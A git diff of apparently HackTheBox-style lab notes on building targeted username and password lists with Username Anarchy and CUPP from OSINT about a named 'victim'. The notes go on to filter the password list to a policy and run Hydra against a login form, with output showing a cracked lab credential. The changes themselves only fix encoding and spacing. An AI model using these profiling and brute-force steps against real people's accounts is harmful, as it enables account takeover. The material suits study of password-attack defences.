@@ -1,52 +1,52 @@
 ﻿---
 sticker: lucide//whole-word
 ---
-While pre-made wordlists likeÂ `rockyou`Â orÂ `SecLists`Â provide an extensive repository of potential passwords and usernames, they operate on a broad spectrum, casting a wide net in the hopes of catching the right combination. While effective in some scenarios, this approach can be inefficient and time-consuming, especially when targeting specific individuals or organizations with unique password or username patterns.
+While pre-made wordlists like`rockyou` or`SecLists` provide an extensive repository of potential passwords and usernames, they operate on a broad spectrum, casting a wide net in the hopes of catching the right combination. While effective in some scenarios, this approach can be inefficient and time-consuming, especially when targeting specific individuals or organizations with unique password or username patterns.
 
-Consider the scenario where a pentester attempts to compromise the account of "Thomas Edison" at his workplace. A generic username list likeÂ `xato-net-10-million-usernames-dup.txt`Â is unlikely to yield any meaningful results. Given the potential username conventions enforced by his company, the probability of his specific username being included in such a massive dataset is minimal. These could range from a straightforward first name/last name format to more intricate combinations like last name/first three.
+Consider the scenario where a pentester attempts to compromise the account of "Thomas Edison" at his workplace. A generic username list like`xato-net-10-million-usernames-dup.txt` is unlikely to yield any meaningful results. Given the potential username conventions enforced by his company, the probability of his specific username being included in such a massive dataset is minimal. These could range from a straightforward first name/last name format to more intricate combinations like last name/first three.
 
 In such cases, the power of custom wordlists comes into play. These meticulously crafted lists, tailored to the specific target and their environment, dramatically increase brute-force attacks' efficiency and success rate. They leverage information gathered from various sources, such as social media profiles, company directories, or even leaked data, to create a focused and highly relevant set of potential passwords and usernames. This laser-sharp approach minimizes wasted effort and maximizes the chances of cracking the target account.
 
 ## Username Anarchy
 
-Even when dealing with a seemingly simple name like "Jane Smith," manual username generation can quickly become a convoluted endeavor. While the obvious combinations likeÂ `jane`,Â `smith`,Â `janesmith`,Â `j.smith`, orÂ `jane.s`Â may seem adequate, they barely scratch the surface of the potential username landscape.
+Even when dealing with a seemingly simple name like "Jane Smith," manual username generation can quickly become a convoluted endeavor. While the obvious combinations like`jane`,`smith`,`janesmith`,`j.smith`, or`jane.s` may seem adequate, they barely scratch the surface of the potential username landscape.
 
-Human creativity knows no bounds, and usernames often become a canvas for personal expression. Jane could seamlessly weave in her middle name, birth year, or a cherished hobby, leading to variations likeÂ `janemarie`,Â `smithj87`, orÂ `jane_the_gardener`. The allure ofÂ `leetspeak`, where letters are replaced with numbers or symbols, could manifest in usernames likeÂ `j4n3`,Â `5m1th`, orÂ `j@n3_5m1th`. Her passion for a particular book, movie, or band might inspire usernames likeÂ `winteriscoming`,Â `potterheadjane`, orÂ `smith_beatles_fan`.
+Human creativity knows no bounds, and usernames often become a canvas for personal expression. Jane could seamlessly weave in her middle name, birth year, or a cherished hobby, leading to variations like`janemarie`,`smithj87`, or`jane_the_gardener`. The allure of`leetspeak`, where letters are replaced with numbers or symbols, could manifest in usernames like`j4n3`,`5m1th`, or`j@n3_5m1th`. Her passion for a particular book, movie, or band might inspire usernames like`winteriscoming`,`potterheadjane`, or`smith_beatles_fan`.
 
-This is whereÂ `Username Anarchy`Â shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username:
+This is where`Username Anarchy` shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username:
 
 ```shell-session
 smoothment@htb[/htb]$ ./username-anarchy -l
 
-Plugin name             Example
+Plugin name Example
 --------------------------------------------------------------------------------
-first                   anna
-firstlast               annakey
-first.last              anna.key
-firstlast[8]            annakey
-first[4]last[4]         annakey
-firstl                  annak
-f.last                  a.key
-flast                   akey
-lfirst                  kanna
-l.first                 k.anna
-lastf                   keya
-last                    key
-last.f                  key.a
-last.first              key.anna
-FLast                   AKey
-first1                  anna0,anna1,anna2
-fl                      ak
-fmlast                  abkey
-firstmiddlelast         annaboomkey
-fml                     abk
-FL                      AK
-FirstLast               AnnaKey
-First.Last              Anna.Key
-Last                    Key
+first anna
+firstlast annakey
+first.last anna.key
+firstlast[8] annakey
+first[4]last[4] annakey
+firstl annak
+f.last a.key
+flast akey
+lfirst kanna
+l.first k.anna
+lastf keya
+last key
+last.f key.a
+last.first key.anna
+FLast AKey
+first1 anna0,anna1,anna2
+fl ak
+fmlast abkey
+firstmiddlelast annaboomkey
+fml abk
+FL AK
+FirstLast AnnaKey
+First.Last Anna.Key
+Last Key
 ```
 
-First, install ruby, and then pull theÂ `Username Anarchy`Â git to get the script:
+First, install ruby, and then pull the`Username Anarchy` git to get the script:
 
 
 ```shell-session
@@ -62,19 +62,19 @@ Next, execute it with the target's first and last names. This will generate poss
 smoothment@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
 ```
 
-Upon inspectingÂ `jane_smith_usernames.txt`, you'll encounter a diverse array of usernames, encompassing:
+Upon inspecting`jane_smith_usernames.txt`, you'll encounter a diverse array of usernames, encompassing:
 
-- Basic combinations:Â `janesmith`,Â `smithjane`,Â `jane.smith`,Â `j.smith`, etc.
-- Initials:Â `js`,Â `j.s.`,Â `s.j.`, etc.
+- Basic combinations:`janesmith`,`smithjane`,`jane.smith`,`j.smith`, etc.
+- Initials:`js`,`j.s.`,`s.j.`, etc.
 - etc
 
 This comprehensive list, tailored to the target's name, is valuable in a brute-force attack.
 
 ## CUPP
 
-With the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is whereÂ `CUPP`Â (Common User Passwords Profiler) steps in, a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.
+With the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is where`CUPP` (Common User Passwords Profiler) steps in, a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.
 
-Let's continue our exploration with Jane Smith. We've already employedÂ `Username Anarchy`Â to generate a list of potential usernames. Now, let's use CUPP to complement this with a targeted password list.
+Let's continue our exploration with Jane Smith. We've already employed`Username Anarchy` to generate a list of potential usernames. Now, let's use CUPP to complement this with a targeted password list.
 
 The efficacy of CUPP hinges on the quality and depth of the information you feed it. It's akin to a detective piecing together a suspect's profile - the more clues you have, the clearer the picture becomes. So, where can one gather this valuable intelligence for a target like Jane Smith?
 
@@ -100,14 +100,14 @@ OSINT will be a goldmine of information for CUPP. Provide as much information as
 
 CUPP will then take your inputs and create a comprehensive list of potential passwords:
 
-- Original and Capitalized:Â `jane`,Â `Jane`
-- Reversed Strings:Â `enaj`,Â `enaJ`
-- Birthdate Variations:Â `jane1994`,Â `smith2708`
-- Concatenations:Â `janesmith`,Â `smithjane`
-- Appending Special Characters:Â `jane!`,Â `smith@`
-- Appending Numbers:Â `jane123`,Â `smith2024`
-- Leetspeak Substitutions:Â `j4n3`,Â `5m1th`
-- Combined Mutations:Â `Jane1994!`,Â `smith2708@`
+- Original and Capitalized:`jane`,`Jane`
+- Reversed Strings:`enaj`,`enaJ`
+- Birthdate Variations:`jane1994`,`smith2708`
+- Concatenations:`janesmith`,`smithjane`
+- Appending Special Characters:`jane!`,`smith@`
+- Appending Numbers:`jane123`,`smith2024`
+- Leetspeak Substitutions:`j4n3`,`5m1th`
+- Combined Mutations:`Jane1994!`,`smith2708@`
 
 This process results in a highly personalized wordlist, significantly more likely to contain Jane's actual password than any generic, off-the-shelf dictionary could ever hope to achieve. This focused approach dramatically increases the odds of success in our password-cracking endeavors.
 
@@ -125,13 +125,13 @@ Invoke CUPP in interactive mode, CUPP will guide you through a series of questio
 smoothment@htb[/htb]$ cupp -i
 
 ___________
-   cupp.py!                 # Common
-      \                     # User
-       \   ,__,             # Passwords
-        \  (oo)____         # Profiler
-           (__)    )\
-              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
-                            [ Mebus | https://github.com/Mebus/]
+ cupp.py! # Common
+ \ # User
+ \ ,__, # Passwords
+ \ (oo)____ # Profiler
+ (__) )\
+ ||--|| * [ Muris Kurgas | j0rgan@remote-exploit.org ]
+ [ Mebus | https://github.com/Mebus/]
 
 
 [+] Insert the information about the victim to make a dictionary
@@ -173,10 +173,10 @@ We now have a generated username.txt list and jane.txt password list, but there 
 
 - Minimum Length: 6 characters
 - Must Include:
-    - At least one uppercase letter
-    - At least one lowercase letter
-    - At least one number
-    - At least two special characters (from the setÂ `!@#$%^&*`)
+ - At least one uppercase letter
+ - At least one lowercase letter
+ - At least one number
+ - At least two special characters (from the set`!@#$%^&*`)
 
 As we did earlier, we can use grep to filter that password list to match that policy:
 
@@ -185,7 +185,7 @@ As we did earlier, we can use grep to filter that password list to match that po
 smoothment@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
 ```
 
-This command efficiently filtersÂ `jane.txt`Â to match the provided policy, from ~46000 passwords to a possible ~7900. It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one lowercase letter, one number, and finally, at least two special characters from the specified set. The filtered results are stored inÂ `jane-filtered.txt`.
+This command efficiently filters`jane.txt` to match the provided policy, from ~46000 passwords to a possible ~7900. It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one lowercase letter, one number, and finally, at least two special characters from the specified set. The filtered results are stored in`jane-filtered.txt`.
 
 Use the two generated lists in Hydra against the target to brute-force the login form. Remember to change the target info for your instance.
 
@@ -198,7 +198,7 @@ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790), ~40942 tries per task
 [DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:Invalid credentials
-[PORT][http-post-form] host: IP   login: ...   password: ...
+[PORT][http-post-form] host: IP login: ... password: ...
 [STATUS] attack finished for IP (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18
@@ -223,13 +223,13 @@ Nice, let's create the passwords list using `cupp`:
 cupp -i
 
 ___________
-   cupp.py!                 # Common
-      \                     # User
-       \   ,__,             # Passwords
-        \  (oo)____         # Profiler
-           (__)    )\
-              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
-                            [ Mebus | https://github.com/Mebus/]
+ cupp.py! # Common
+ \ # User
+ \ ,__, # Passwords
+ \ (oo)____ # Profiler
+ (__) )\
+ ||--|| * [ Muris Kurgas | j0rgan@remote-exploit.org ]
+ [ Mebus | https://github.com/Mebus/]
 
 
 [+] Insert the information about the victim to make a dictionary
@@ -288,7 +288,7 @@ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-13 20:55:43
 [DATA] max 60 tasks per 1 server, overall 60 tasks, 111286 login tries (l:14/p:7949), ~1855 tries per task
 [DATA] attacking http-post-form://94.237.56.165:46400/:username=^USER^&password=^PASS^:Invalid credentials
-[46400][http-post-form] host: 94.237.56.165   login: jane   password: 3n4J!!
+[46400][http-post-form] host: 94.237.56.165 login: jane password: 3n4J!!
 [STATUS] attack finished for 94.237.56.165 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 ```
